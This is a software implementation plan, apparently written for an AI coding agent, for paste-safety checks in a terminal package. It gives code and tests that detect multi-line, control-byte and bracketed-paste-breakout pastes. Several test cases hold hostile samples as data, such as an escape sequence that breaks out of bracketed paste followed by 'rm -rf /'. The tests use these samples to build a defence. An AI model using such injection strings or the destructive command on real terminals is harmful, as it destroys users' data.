# Terminal Plan 1 — Paste Safety Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** A paste that could run commands by itself is either cleaned (inside bracketed paste) or confirmed by the user first (outside bracketed paste), while the shell-prompt editor path and every host without a confirm handler behave exactly as today.

**Architecture:** One pure function in `packages/terminal/ts/editor/src/paste.ts` (`encodePaste`) turns pasted text into pty bytes plus a verdict. A second function (`deliverPaste`) sends safe bytes at once and asks an optional confirm callback for unsafe ones. The package exposes the confirm as an optional host seam, `HostCapabilities.confirmPaste`. Operator implements it in `frontend/` with the existing shadcn-based `ConfirmDialog`. `packages/terminal` never learns what the dialog looks like.

**Tech Stack:** TypeScript 5.9.3, vitest 4.1.8 (jsdom), React 19, Radix/shadcn dialog (`frontend/src/renderer/components/ConfirmDialog.tsx`), i18next (`frontend/src/renderer/i18n/en.json`), `@testing-library/react` + `@testing-library/user-event`.

**Spec:** `docs/terminal/2026-09-24-terminal-roadmap-design.md`, section "Plan 1 — Paste safety (§1.10, §2.11)" and "Rules every plan obeys". Survey entries: `docs/terminal/2026-09-19-terminal-reference-survey.md` §1.10 (line 766) and §2.11 (line 1786). Mandatory reading: `TERMINAL.md` (repo root), start to end, before Task 1.

## Global Constraints

- **No code comments in new code** (the user's global rule and `TERMINAL.md` §3.3). Existing comments stay unless they become false.
- **Commits:** stage explicit paths only (`git add <path> <path>`). Never `git add -A`, `git add .` or `git commit -a`. Never `git stash`. Commit messages are conventional (`feat:`, `test:`, `docs:`) and end with the `Co-Authored-By:` trailer your harness gives you.
- **`packages/terminal` stays product-independent** (`TERMINAL.md` §3.1): nothing under `packages/terminal/ts/` may name Operator, import from `frontend/`, or decide what the confirm looks like. The package passes a preview string and a reason; the host decides. Gate: `npm --prefix packages/terminal run check:boundaries` must print `boundary check passed`. It also enforces a 600-line limit per source file.
- **Licences:** Ghostty (MIT) and Alacritty (Apache-2.0/MIT) are described **by behaviour only** in this plan. No code is copied from them, so no attribution file is added. Never copy code from Kitty (GPL-3.0) or Warp (AGPL-3.0).
- **Evidence:** docs and the completion report cite `file:line` or write "not known". Never claim a gate passed without its output line. If a command cannot run in the cloud session, record `not run: <exact reason>`.
- **No `vt-core` change in this plan.** So there is no Rust change and no host-mirror wasm rebuild, and the daemon does not need rebuilding. The renderer wasm still has to be *built once* in Task 0, because `packages/terminal/ts/core/wasm/` is gitignored and the tests load it.
- **Behaviour decisions are fixed (do not re-decide):**
  - Inside bracketed paste (the child set DEC mode 2004): remove every `ESC[201~`, then every `\x1b` and every `\x03`, wrap in `ESC[200~`…`ESC[201~`. The result is always **safe** and is sent without asking. `\r\n` and `\n` become `\r` as today.
  - Outside bracketed paste, when the line editor does **not** own the line: `\r\n` and `\n` become `\r` as today. The verdict is **unsafe** with reason `"paste-end"` if the bytes contain `ESC[201~`, else `"control"` if they contain any C0 control other than `\t`, `\n` or `\r` (`\x00-\x08`, `\x0b`, `\x0c`, `\x0e-\x1f`), else `"newline"` if they contain `\r` (that is, the paste had any `\n` or `\r`). Otherwise **safe**.
  - Editor-owned line (`core.lineEditorState() === "owned"`, the shell prompt): unchanged. The text is inserted into the editor, nothing runs until Enter, and the user is never asked.
  - Image paste (no text, image on clipboard, child owns the line): unchanged. It sends `\x16` (Ctrl+V) and is always safe.
  - Host seam: `HostCapabilities.confirmPaste?(preview: string, reason: "newline" | "control" | "paste-end"): Promise<boolean>`. With no handler the bytes are sent at once, exactly as today. Handler resolves `false`, rejects or throws: nothing is sent. Handler resolves `true`: the exact bytes computed at paste time are sent once.
  - Operator: a confirm dialog showing the first 5 lines of the paste and a one-line reason. Buttons "Paste" and "Cancel". No "don't ask again".
- **Operator UI copy** lives in `frontend/src/renderer/i18n/en.json` (flat keys, `keySeparator: false`) and is read with `t()`. That is how every `frontend/` component does it, for example `useRelaunchConfirm.tsx`. Operator's look follows `DESIGN.md`'s top banner ("clone agent-orchestrator verbatim"). Reusing `ConfirmDialog` keeps the look without new styling decisions.
- **Paths:** the cloud checkout's absolute path is not known in advance. Every command below starts with `cd "$(git rev-parse --show-toplevel)/…"`, so it works from anywhere inside the checkout. Run them exactly as written.

## Review Focus

These are the most likely ways a real person gets hurt that the spec's own test list does not cover. Each line has a test in the task that owns the code.

1. **A single copied command line with a trailing newline** (`ls\n`, very common when copying from a web page). Outside bracketed paste this must ask (reason `newline`), because the `\r` would run it. Test: Task 1, `encodePaste` table row "a trailing newline".
2. **The pane or editor is torn down while the dialog is open** (session closed, tab switched, alt screen left). A late "Paste" must send nothing to a surface that no longer owns the pty. Tests: Task 2 "drops a confirmed paste whose editor was disposed while asking"; the alt-screen path gets the same guard in Task 3 code.
3. **The host's confirm fails** (it rejects, or throws synchronously). The paste must be dropped quietly: no bytes and no unhandled rejection. Tests: Task 1 `deliverPaste` "sends nothing when the confirm rejects" and "sends nothing when the confirm throws".
4. **A second paste while the dialog is still open** (the Edit menu's Paste, or a double shortcut). The first request must resolve `false` so it can never be sent late, and the dialog must show the second paste. Test: Task 4 "answers an earlier request no when a new one arrives".
5. **A huge or hostile paste** (thousands of lines, one line of 100 KB, invisible control bytes). The dialog must stay small, show 5 lines of at most 200 characters, say how many lines are hidden, and make control bytes visible as `^X`. Tests: Task 1 `pastePreview`; Task 4 "limits the preview to five lines of 200 characters" and "shows control characters as caret notation with the control reason".

---

## File map

| File | Change | Responsibility |
|---|---|---|
| `packages/terminal/ts/core/src/types.ts` | Modify `:248-258` | `PasteUnsafeReason` type; `HostCapabilities.confirmPaste?` seam |
| `packages/terminal/ts/core/src/index-browser.ts` | Modify `:5-36` | export `PasteUnsafeReason` |
| `packages/terminal/ts/editor/src/paste.ts` | Rewrite `:1-27` | `encodePaste`, `pastePreview`, `deliverPaste`, `planPaste` with verdict |
| `packages/terminal/ts/editor/src/paste.test.ts` | Rewrite | verdict table, preview, delivery, plan |
| `packages/terminal/ts/editor/src/index.ts` | Modify `:4` | export the new functions and types |
| `packages/terminal/ts/editor/src/line-editor.ts` | Modify `:17`, `:53`, `:137-140`, `:229-233` | `setPasteConfirm`, deliver through `deliverPaste` |
| `packages/terminal/ts/editor/src/line-editor-paste.test.ts` | Rewrite | confirm/decline/dispose/owned/bracketed through the real editor |
| `packages/terminal/ts/react/src/TerminalSurface.tsx` | Modify `:2`, `:125`, `:172`, `:245`, `:303-353` | pass `host.confirmPaste` to the editor and to the alt-screen paste |
| `packages/terminal/ts/react/src/TerminalSurface.paste.test.tsx` | Rewrite | both surfaces ask, decline sends nothing, bracketed never asks |
| `packages/terminal/ts/react/src/index.ts` | Modify `:13-21` | re-export `PasteUnsafeReason` |
| `frontend/src/renderer/hooks/usePasteConfirm.tsx` | Create | Operator's confirm: promise-returning `confirmPaste` + the dialog element |
| `frontend/src/renderer/hooks/usePasteConfirm.test.tsx` | Create | dialog behaviour |
| `frontend/src/renderer/i18n/en.json` | Modify after `:917` | seven copy keys |
| `frontend/src/renderer/components/BlockTerminal.tsx` | Modify `:24`, `:464`, `:487-490`, `:637` | wire the hook into `host` and render the dialog |
| `frontend/src/renderer/components/BlockTerminal.test.tsx` | Modify `:2`, `:38`, `:161`, append | host carries `confirmPaste`; dialog round trip |
| `packages/terminal/CHANGELOG.md` | Modify `:3-5` | Unreleased entry |
| `TERMINAL.md` | Modify before `:834` | new §4.27 "Paste safety" |
| `docs/terminal/2026-09-19-terminal-reference-survey.md` | Modify `:50`, `:63`, `:82`, `:768`, `:1788` | status lines and counts |
| `docs/terminal/2026-09-24-not-done-plain-language.md` | Modify `:5-7`, `:37-41`, `:147` | item 5 done |

---

### Task 0: Branch and environment for a cloud session

**Files:** none changed.

**Interfaces:**
- Consumes: nothing.
- Produces: branch `terminal/plan-1-paste-safety` from `origin/development`; built `packages/terminal` (`ts/core/wasm/*` and every `ts/*/dist`); installed `frontend/node_modules`; a written baseline of pre-existing test failures.

- [ ] **Step 1: Create the branch**

```bash
cd "$(git rev-parse --show-toplevel)" && git fetch origin && git checkout -b terminal/plan-1-paste-safety origin/development && git status --short && git log --oneline -1
```

Expected: `Switched to a new branch 'terminal/plan-1-paste-safety'`, then no `git status --short` output, then one commit line.

- [ ] **Step 2: Read the mandatory docs**

Read these completely, with the Read tool:
- `TERMINAL.md` from start to end. §3 "Hard rules" and §6 "Verify and ship" apply to this plan. The recipe's absolute paths (`/Users/omaraly/...`) are the owner's machine; use `$(git rev-parse --show-toplevel)` instead.
- `docs/terminal/2026-09-24-terminal-roadmap-design.md` lines 39-71 and 94-133.
- `docs/terminal/2026-09-19-terminal-reference-survey.md` lines 766-813 and 1786-1814.

No command. Do not edit these files in this step.

- [ ] **Step 3: Check the toolchain**

```bash
node --version; rustup --version; rustc --version; wasm-bindgen --version; go version
```

Expected: node `v24.x` (CI uses 24; v22+ is fine). `rustc 1.96.0 …` once rustup has read `packages/terminal/rust-toolchain.toml`. `wasm-bindgen 0.2.127`. Some of these may print `command not found`; Step 4 installs them.

- [ ] **Step 4: Install what is missing (the same commands CI uses in `.github/workflows/frontend.yml:36-51`)**

```bash
cd "$(git rev-parse --show-toplevel)" && rustup toolchain install 1.96.0 --profile minimal && rustup target add wasm32-unknown-unknown --toolchain 1.96.0
```

```bash
wasm-bindgen --version 2>/dev/null | grep -q "0.2.127" || cargo +1.96.0 install wasm-bindgen-cli --version 0.2.127 --locked
```

If `rustup` itself is missing and cannot be installed (no network, no permission), write `not run: no Rust toolchain in the cloud session` in your notes. In that case only `paste.test.ts` (Task 1) and the frontend tests can run: the other terminal tests read `ts/core/wasm/vt_core_bg.wasm`, which only `build:wasm` produces. Carry on with the tasks and record every skipped gate in the final report.

- [ ] **Step 5: Install JavaScript dependencies**

```bash
cd "$(git rev-parse --show-toplevel)" && npm ci --prefix packages/terminal && npm ci --prefix frontend
```

Expected: both finish with `added N packages` and no `ERR!`.

- [ ] **Step 6: Build the terminal package (wasm + TypeScript)**

```bash
cd "$(git rev-parse --show-toplevel)/packages/terminal" && npm run build
```

Expected: the output contains `build-wasm: vt_core.js, vt_core.d.ts, vt_core_bg.wasm, vt_core_bg.wasm.d.ts ready`, and `tsc -b` exits 0 with no output.

- [ ] **Step 7: Install Playwright Chromium for the bench gates (same as `.github/workflows/terminal.yml:48`)**

```bash
cd "$(git rev-parse --show-toplevel)" && npx --prefix packages/terminal playwright install --with-deps chromium
```

Expected: Chromium downloads, or `is already installed`. If `--with-deps` fails for lack of sudo, retry without `--with-deps`. If that also fails, record `not run: Playwright Chromium unavailable (<error line>)` for every `bench:*` gate in Task 6.

- [ ] **Step 8: Record the baseline of the suites this plan touches**

```bash
cd "$(git rev-parse --show-toplevel)/packages/terminal/ts/editor" && npx vitest run 2>&1 | tail -5
cd "$(git rev-parse --show-toplevel)/packages/terminal/ts/react" && npx vitest run 2>&1 | tail -5
cd "$(git rev-parse --show-toplevel)/frontend" && npx vitest run src/renderer/components/BlockTerminal.test.tsx 2>&1 | tail -5
```

Expected: each ends in `Test Files  N passed (N)` with `0 failed`. Write the three `Tests …` lines into your notes as the baseline. If a file already fails here, note its name: it is pre-existing, and Task 6 compares against it.

No commit in this task.

---

### Task 1: The pure paste rule (`encodePaste`, `pastePreview`, `deliverPaste`) and the host seam type

**Files:**
- Modify: `packages/terminal/ts/core/src/types.ts:248-258`
- Modify: `packages/terminal/ts/core/src/index-browser.ts:22`
- Rewrite: `packages/terminal/ts/editor/src/paste.ts` (currently 41 lines; `planPaste` at `:17-27`)
- Modify: `packages/terminal/ts/editor/src/index.ts:4`
- Rewrite: `packages/terminal/ts/editor/src/paste.test.ts`

**Interfaces:**
- Consumes: nothing new.
- Produces (later tasks rely on these exact names):
  - `@operator/terminal-core`: `export type PasteUnsafeReason = "newline" | "control" | "paste-end";` and `HostCapabilities.confirmPaste?(preview: string, reason: PasteUnsafeReason): Promise<boolean>`.
  - `@operator/terminal-editor`:
    - `type PasteVerdict = Readonly<{ safe: true }> | Readonly<{ safe: false; reason: PasteUnsafeReason }>`
    - `type EncodedPaste = Readonly<{ data: string; verdict: PasteVerdict }>`
    - `type PasteConfirm = (preview: string, reason: PasteUnsafeReason) => Promise<boolean>`
    - `type PastePlan = { kind: "insert"; text } | { kind: "send"; data; verdict: PasteVerdict } | { kind: "none" }` (all Readonly)
    - `encodePaste(text: string, bracketedPaste: boolean): EncodedPaste`
    - `pastePreview(data: string): string`
    - `deliverPaste(plan: PastePlan, send: (data: string) => void, confirm?: PasteConfirm): Promise<boolean>`: sends synchronously when the verdict is safe or `confirm` is undefined; resolves `true` if and only if the bytes were sent.
    - `planPaste(input: PasteInput): PastePlan`, `clipboardHasImage(data)`: signatures unchanged.

- [ ] **Step 1: Write the failing tests: replace the whole of `packages/terminal/ts/editor/src/paste.test.ts` with**

```ts
import { describe, expect, it, vi } from "vitest";
import {
	clipboardHasImage,
	deliverPaste,
	encodePaste,
	pastePreview,
	planPaste,
	type PasteConfirm,
	type PasteVerdict,
} from "./paste";

const owned = { owned: true, bracketedPaste: false };
const child = { owned: false, bracketedPaste: false };
const safe: PasteVerdict = { safe: true };
const newline: PasteVerdict = { safe: false, reason: "newline" };
const control: PasteVerdict = { safe: false, reason: "control" };
const pasteEnd: PasteVerdict = { safe: false, reason: "paste-end" };

describe("clipboardHasImage", () => {
	const transfer = (over: Partial<DataTransfer>) =>
		({ types: [], files: [], items: [], ...over }) as unknown as DataTransfer;

	it("sees Chromium's image type", () => {
		expect(clipboardHasImage(transfer({ types: ["image/png"] }))).toBe(true);
	});

	it("sees WebKit's file item behind a bare Files type", () => {
		expect(
			clipboardHasImage(
				transfer({
					types: ["Files"],
					items: [{ kind: "file", type: "image/png" }] as unknown as DataTransferItemList,
				}),
			),
		).toBe(true);
	});

	it("does not mistake a pasted text file for an image", () => {
		expect(
			clipboardHasImage(
				transfer({
					types: ["Files"],
					items: [{ kind: "file", type: "text/csv" }] as unknown as DataTransferItemList,
				}),
			),
		).toBe(false);
	});
});

describe("encodePaste", () => {
	type Case = Readonly<{ name: string; text: string; bracketed: boolean; data: string; verdict: PasteVerdict }>;
	const cases: readonly Case[] = [
		{ name: "a plain one-line paste", text: "ls -la", bracketed: false, data: "ls -la", verdict: safe },
		{ name: "a tab", text: "a\tb", bracketed: false, data: "a\tb", verdict: safe },
		{ name: "a multi-line paste outside brackets", text: "one\ntwo", bracketed: false, data: "one\rtwo", verdict: newline },
		{ name: "a trailing newline", text: "ls\n", bracketed: false, data: "ls\r", verdict: newline },
		{ name: "CRLF outside brackets", text: "one\r\ntwo", bracketed: false, data: "one\rtwo", verdict: newline },
		{ name: "a lone CR outside brackets", text: "one\rtwo", bracketed: false, data: "one\rtwo", verdict: newline },
		{ name: "an embedded ESC outside brackets", text: "a\x1bb", bracketed: false, data: "a\x1bb", verdict: control },
		{ name: "a ^C outside brackets", text: "a\x03b", bracketed: false, data: "a\x03b", verdict: control },
		{ name: "a NUL outside brackets", text: "a\x00b", bracketed: false, data: "a\x00b", verdict: control },
		{ name: "a control and a newline", text: "a\x1b\nb", bracketed: false, data: "a\x1b\rb", verdict: control },
		{ name: "the paste-end sequence outside brackets", text: "a\x1b[201~b\n", bracketed: false, data: "a\x1b[201~b\r", verdict: pasteEnd },
		{ name: "a multi-line paste inside brackets", text: "one\ntwo", bracketed: true, data: "\x1b[200~one\rtwo\x1b[201~", verdict: safe },
		{ name: "CRLF inside brackets", text: "one\r\ntwo", bracketed: true, data: "\x1b[200~one\rtwo\x1b[201~", verdict: safe },
		{ name: "an ESC inside brackets", text: "a\x1bb", bracketed: true, data: "\x1b[200~ab\x1b[201~", verdict: safe },
		{ name: "a ^C inside brackets", text: "a\x03b", bracketed: true, data: "\x1b[200~ab\x1b[201~", verdict: safe },
		{ name: "the paste-end sequence inside brackets", text: "a\x1b[201~rm -rf /", bracketed: true, data: "\x1b[200~arm -rf /\x1b[201~", verdict: safe },
		{ name: "a paste-end hidden inside another", text: "\x1b[20\x1b[201~1~x", bracketed: true, data: "\x1b[200~[201~x\x1b[201~", verdict: safe },
		{ name: "a tab inside brackets", text: "a\tb", bracketed: true, data: "\x1b[200~a\tb\x1b[201~", verdict: safe },
	];

	it.each(cases)("$name", ({ text, bracketed, data, verdict }) => {
		expect(encodePaste(text, bracketed)).toEqual({ data, verdict });
	});
});

describe("pastePreview", () => {
	it("shows each carriage return as a line break", () => {
		expect(pastePreview("one\rtwo\r\nthree")).toBe("one\ntwo\nthree");
	});

	it("makes control characters visible as caret notation and keeps tabs", () => {
		expect(pastePreview("a\x1b[31mb\x03\tc\x7f\x00")).toBe("a^[[31mb^C\tc^?^@");
	});
});

describe("deliverPaste", () => {
	const unsafe = { kind: "send", data: "one\rtwo", verdict: newline } as const;

	it("sends a safe paste at once and never asks", async () => {
		const sent: string[] = [];
		const confirm = vi.fn<PasteConfirm>(async () => false);
		const delivered = deliverPaste({ kind: "send", data: "hello", verdict: safe }, (data) => sent.push(data), confirm);
		expect(sent).toEqual(["hello"]);
		await expect(delivered).resolves.toBe(true);
		expect(confirm).not.toHaveBeenCalled();
	});

	it("sends an unsafe paste at once when the host has no confirm, as before", async () => {
		const sent: string[] = [];
		const delivered = deliverPaste(unsafe, (data) => sent.push(data));
		expect(sent).toEqual(["one\rtwo"]);
		await expect(delivered).resolves.toBe(true);
	});

	it("asks with a readable preview and the reason, then sends the exact bytes once", async () => {
		const sent: string[] = [];
		const confirm = vi.fn<PasteConfirm>(async () => true);
		const delivered = deliverPaste(unsafe, (data) => sent.push(data), confirm);
		expect(sent).toEqual([]);
		await expect(delivered).resolves.toBe(true);
		expect(confirm).toHaveBeenCalledTimes(1);
		expect(confirm).toHaveBeenCalledWith("one\ntwo", "newline");
		expect(sent).toEqual(["one\rtwo"]);
	});

	it("sends nothing when the user declines", async () => {
		const sent: string[] = [];
		const delivered = deliverPaste(unsafe, (data) => sent.push(data), vi.fn<PasteConfirm>(async () => false));
		await expect(delivered).resolves.toBe(false);
		expect(sent).toEqual([]);
	});

	it("sends nothing when the confirm rejects", async () => {
		const sent: string[] = [];
		const confirm = vi.fn<PasteConfirm>(async () => {
			throw new Error("dialog closed");
		});
		await expect(deliverPaste(unsafe, (data) => sent.push(data), confirm)).resolves.toBe(false);
		expect(sent).toEqual([]);
	});

	it("sends nothing when the confirm throws", async () => {
		const sent: string[] = [];
		const confirm = vi.fn<PasteConfirm>(() => {
			throw new Error("no dialog");
		});
		await expect(deliverPaste(unsafe, (data) => sent.push(data), confirm)).resolves.toBe(false);
		expect(sent).toEqual([]);
	});

	it("sends nothing for a plan that inserts or does nothing", async () => {
		const sent: string[] = [];
		await expect(deliverPaste({ kind: "insert", text: "x" }, (data) => sent.push(data))).resolves.toBe(false);
		await expect(deliverPaste({ kind: "none" }, (data) => sent.push(data))).resolves.toBe(false);
		expect(sent).toEqual([]);
	});
});

describe("planPaste", () => {
	it("edits locally while the editor owns the line", () => {
		expect(planPaste({ text: "ls -la", hasImage: false, ...owned })).toEqual({
			kind: "insert",
			text: "ls -la",
		});
	});

	it("keeps newlines as newlines in the editor, where they are not submissions", () => {
		expect(planPaste({ text: "one\r\ntwo", hasImage: false, ...owned })).toEqual({
			kind: "insert",
			text: "one\ntwo",
		});
	});

	it("never judges what goes into the editor, since nothing runs before Enter", () => {
		expect(planPaste({ text: "rm -rf /\x1b\x03\n", hasImage: false, ...owned })).toEqual({
			kind: "insert",
			text: "rm -rf /\x1b\x03\n",
		});
	});

	it("sends the text to a child that owns the line", () => {
		expect(planPaste({ text: "hello", hasImage: false, ...child })).toEqual({
			kind: "send",
			data: "hello",
			verdict: safe,
		});
	});

	// A pty takes CR, not LF: pasting "a\nb" as LF leaves the shell waiting on a
	// line it never sees end.
	it("turns newlines into carriage returns for a child and marks them unsafe", () => {
		expect(planPaste({ text: "one\r\ntwo\nthree", hasImage: false, ...child })).toEqual({
			kind: "send",
			data: "one\rtwo\rthree",
			verdict: newline,
		});
	});

	it("brackets the paste for a program that asked for it", () => {
		expect(
			planPaste({ text: "one\ntwo", hasImage: false, owned: false, bracketedPaste: true }),
		).toEqual({ kind: "send", data: "\x1b[200~one\rtwo\x1b[201~", verdict: safe });
	});

	// The escape would end the bracket early and the rest of the paste would run
	// as typed input. xterm drops it; so do we.
	it("strips a closing bracket hidden in the pasted text", () => {
		expect(
			planPaste({ text: "a\x1b[201~rm -rf /", hasImage: false, owned: false, bracketedPaste: true }),
		).toEqual({ kind: "send", data: "\x1b[200~arm -rf /\x1b[201~", verdict: safe });
	});

	it("does nothing for an empty clipboard", () => {
		expect(planPaste({ text: "", hasImage: false, ...child })).toEqual({ kind: "none" });
	});

	// A pty carries bytes, so an image cannot be sent. Claude Code reads the
	// system clipboard itself when it sees Ctrl+V, which is exactly what an
	// image paste should turn into for the program holding the line.
	it("hands an image to the child as Ctrl+V so it can read the clipboard itself", () => {
		expect(planPaste({ text: "", hasImage: true, ...child })).toEqual({
			kind: "send",
			data: "\x16",
			verdict: safe,
		});
	});

	it("prefers the text when the clipboard carries both", () => {
		expect(planPaste({ text: "caption", hasImage: true, ...child })).toEqual({
			kind: "send",
			data: "caption",
			verdict: safe,
		});
	});

	it("has nowhere to put an image while the editor owns the line", () => {
		expect(planPaste({ text: "", hasImage: true, ...owned })).toEqual({ kind: "none" });
	});
});
```

(The three `//` comments inside this file already exist in the current `paste.test.ts` at `:60-61`, `:75-76`, `:87-89` and are carried over unchanged. Do not add any others.)

- [ ] **Step 2: Run it and watch it fail**

```bash
cd "$(git rev-parse --show-toplevel)/packages/terminal/ts/editor" && npx vitest run src/paste.test.ts 2>&1 | tail -15
```

Expected: FAIL. The `encodePaste`, `pastePreview` and `deliverPaste` tests fail with `… is not a function`. The planPaste `send` cases fail on `toEqual` because `verdict` is missing. The 3 `clipboardHasImage` tests and the `insert`/`none` planPaste tests pass.

- [ ] **Step 3: Add the seam type to `packages/terminal/ts/core/src/types.ts`**

Replace the block at `:248-258`:

```ts
export type HostCapabilities = Readonly<{
	writeClipboard(text: string): Promise<void>;
	readClipboard(): Promise<string>;
	openLink(url: string): Promise<void>;
	notify?(title: string, body: string): void;
	listDirectory?(path: string): Promise<readonly DirEntry[]>;
	resolveFirstPath?(candidates: readonly PathCandidate[], cwd: string): Promise<ResolvedPath | null>;
	openPath?(path: string, line?: number, column?: number): Promise<void>;
	secretPatterns?: readonly SecretPattern[];
	predictiveEcho?: Readonly<{ thresholdMs: number }>;
}>;
```

with:

```ts
export type PasteUnsafeReason = "newline" | "control" | "paste-end";

export type HostCapabilities = Readonly<{
	writeClipboard(text: string): Promise<void>;
	readClipboard(): Promise<string>;
	openLink(url: string): Promise<void>;
	notify?(title: string, body: string): void;
	listDirectory?(path: string): Promise<readonly DirEntry[]>;
	resolveFirstPath?(candidates: readonly PathCandidate[], cwd: string): Promise<ResolvedPath | null>;
	openPath?(path: string, line?: number, column?: number): Promise<void>;
	secretPatterns?: readonly SecretPattern[];
	predictiveEcho?: Readonly<{ thresholdMs: number }>;
	confirmPaste?(preview: string, reason: PasteUnsafeReason): Promise<boolean>;
}>;
```

- [ ] **Step 4: Export it from `packages/terminal/ts/core/src/index-browser.ts`**

In the `export type { … } from "./types.js";` list (`:5-36`), replace:

```ts
	PaletteCommand,
	PathCandidate,
```

with:

```ts
	PaletteCommand,
	PasteUnsafeReason,
	PathCandidate,
```

(`ts/core/src/index.ts` re-exports `./index-browser.js` with `export *`, so it needs no edit.)

- [ ] **Step 5: Rewrite `packages/terminal/ts/editor/src/paste.ts`**

Replace the whole file with:

```ts
import type { PasteUnsafeReason } from "@operator/terminal-core";

export type PasteVerdict = Readonly<{ safe: true }> | Readonly<{ safe: false; reason: PasteUnsafeReason }>;

export type EncodedPaste = Readonly<{ data: string; verdict: PasteVerdict }>;

export type PasteConfirm = (preview: string, reason: PasteUnsafeReason) => Promise<boolean>;

export type PastePlan =
	| Readonly<{ kind: "insert"; text: string }>
	| Readonly<{ kind: "send"; data: string; verdict: PasteVerdict }>
	| Readonly<{ kind: "none" }>;

export type PasteInput = Readonly<{
	text: string;
	hasImage: boolean;
	owned: boolean;
	bracketedPaste: boolean;
}>;

const PASTE_START = "\x1b[200~";
const PASTE_END = "\x1b[201~";
const CTRL_V = "\x16";
const SAFE: PasteVerdict = { safe: true };
const UNSAFE_CONTROL = /[\x00-\x08\x0b\x0c\x0e-\x1f]/;
const BRACKET_BREAKERS = /[\x1b\x03]/g;
const PREVIEW_CONTROL = /[\x00-\x08\x0b-\x1f\x7f]/g;

export function encodePaste(text: string, bracketedPaste: boolean): EncodedPaste {
	const data = text.replace(/\r\n|\n/g, "\r");
	if (bracketedPaste) {
		const body = data.split(PASTE_END).join("").replace(BRACKET_BREAKERS, "");
		return { data: `${PASTE_START}${body}${PASTE_END}`, verdict: SAFE };
	}
	return { data, verdict: verdictFor(data) };
}

function verdictFor(data: string): PasteVerdict {
	if (data.includes(PASTE_END)) return { safe: false, reason: "paste-end" };
	if (UNSAFE_CONTROL.test(data)) return { safe: false, reason: "control" };
	if (data.includes("\r")) return { safe: false, reason: "newline" };
	return SAFE;
}

export function pastePreview(data: string): string {
	return data
		.replace(/\r\n?/g, "\n")
		.replace(PREVIEW_CONTROL, (char) =>
			char === "\x7f" ? "^?" : `^${String.fromCharCode(char.charCodeAt(0) + 64)}`,
		);
}

export function deliverPaste(
	plan: PastePlan,
	send: (data: string) => void,
	confirm?: PasteConfirm,
): Promise<boolean> {
	if (plan.kind !== "send") return Promise.resolve(false);
	const { data, verdict } = plan;
	if (verdict.safe || !confirm) {
		send(data);
		return Promise.resolve(true);
	}
	const reason = verdict.reason;
	return Promise.resolve()
		.then(() => confirm(pastePreview(data), reason))
		.then(
			(accepted) => {
				if (accepted !== true) return false;
				send(data);
				return true;
			},
			() => false,
		);
}

export function planPaste(input: PasteInput): PastePlan {
	const { text, hasImage, owned, bracketedPaste } = input;
	if (text.length > 0) {
		if (owned) return { kind: "insert", text: text.replace(/\r\n?/g, "\n") };
		return { kind: "send", ...encodePaste(text, bracketedPaste) };
	}
	if (hasImage && !owned) return { kind: "send", data: CTRL_V, verdict: SAFE };
	return { kind: "none" };
}

// WebKit reports an image paste as the type "Files" with an image item behind
// it, Chromium as "image/png". Both shapes have to count or the same clipboard
// pastes on one engine and not the other.
export function clipboardHasImage(data: DataTransfer | null): boolean {
	if (!data) return false;
	for (const type of data.types) {
		if (type.startsWith("image/")) return true;
	}
	if (Array.from(data.files ?? []).some((file) => file.type.startsWith("image/"))) return true;
	return Array.from(data.items ?? []).some(
		(item) => item.kind === "file" && item.type.startsWith("image/"),
	);
}
```

(The `clipboardHasImage` comment is the existing one from `:29-31`, carried over unchanged.)

- [ ] **Step 6: Export from `packages/terminal/ts/editor/src/index.ts`**

Replace line 4:

```ts
export { clipboardHasImage, planPaste, type PastePlan } from "./paste.js";
```

with:

```ts
export {
	clipboardHasImage,
	deliverPaste,
	encodePaste,
	pastePreview,
	planPaste,
	type EncodedPaste,
	type PasteConfirm,
	type PastePlan,
	type PasteVerdict,
} from "./paste.js";
```

- [ ] **Step 7: Run the tests and watch them pass**

```bash
cd "$(git rev-parse --show-toplevel)/packages/terminal/ts/editor" && npx vitest run src/paste.test.ts 2>&1 | tail -6
```

Expected: `Test Files  1 passed (1)` and `Tests  41 passed (41)`.

- [ ] **Step 8: Typecheck the package build**

```bash
cd "$(git rev-parse --show-toplevel)/packages/terminal" && npm run build:ts
```

Expected: exit 0 and no `error TS` lines. `line-editor.ts:233` still compiles: `plan.data` still exists on the `send` kind.

- [ ] **Step 9: Commit**

```bash
cd "$(git rev-parse --show-toplevel)" && git add packages/terminal/ts/core/src/types.ts packages/terminal/ts/core/src/index-browser.ts packages/terminal/ts/editor/src/paste.ts packages/terminal/ts/editor/src/paste.test.ts packages/terminal/ts/editor/src/index.ts && git commit -m "feat(terminal): paste verdict, bracketed ESC/^C strip and confirm seam

Co-Authored-By: Claude Sonnet 5 <noreply@anthropic.com>"
```

---

### Task 2: The line editor asks before an unsafe paste to a child

This is the path Claude Code uses: it runs on the primary screen, so its pastes go through the line editor's passthrough (`line-editor.ts:218-234`) and never reach the alt-screen handler.

**Files:**
- Modify: `packages/terminal/ts/editor/src/line-editor.ts:17`, `:53`, `:137-140`, `:229-233`
- Rewrite: `packages/terminal/ts/editor/src/line-editor-paste.test.ts`

**Interfaces:**
- Consumes: `deliverPaste`, `planPaste`, `type PasteConfirm` from `./paste.js` (Task 1).
- Produces: `LineEditor.setPasteConfirm(confirm: PasteConfirm | null): void`. It keeps its value across `mount`/`dispose`. `null` (the default) means "no handler": unsafe pastes are sent at once, as today. A paste confirmed after the editor was disposed or remounted is dropped.

- [ ] **Step 1: Write the failing tests: replace the whole of `packages/terminal/ts/editor/src/line-editor-paste.test.ts` with**

```ts
import { readFile } from "node:fs/promises";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { beforeAll, describe, expect, it, vi } from "vitest";
import { createTerminalCore, initTerminalCore } from "@operator/terminal-core";
import { LineEditor, type EditorHost } from "./line-editor";
import type { PasteConfirm } from "./paste";

const encode = (text: string) => new TextEncoder().encode(text);
const settle = () => new Promise((resolve) => setTimeout(resolve, 0));

beforeAll(async () => {
	const bytes = await readFile(join(dirname(fileURLToPath(import.meta.url)), "..", "..", "core", "wasm", "vt_core_bg.wasm"));
	await initTerminalCore(
		bytes.buffer.slice(bytes.byteOffset, bytes.byteOffset + bytes.byteLength) as ArrayBuffer,
	);
});

function mount() {
	const sent: string[] = [];
	const raw: string[] = [];
	const host: EditorHost = { send: (text) => sent.push(text), sendRaw: (data) => raw.push(data) };
	const core = createTerminalCore({ columns: 80, scrollback: 100 });
	const editor = new LineEditor();
	const container = document.createElement("div");
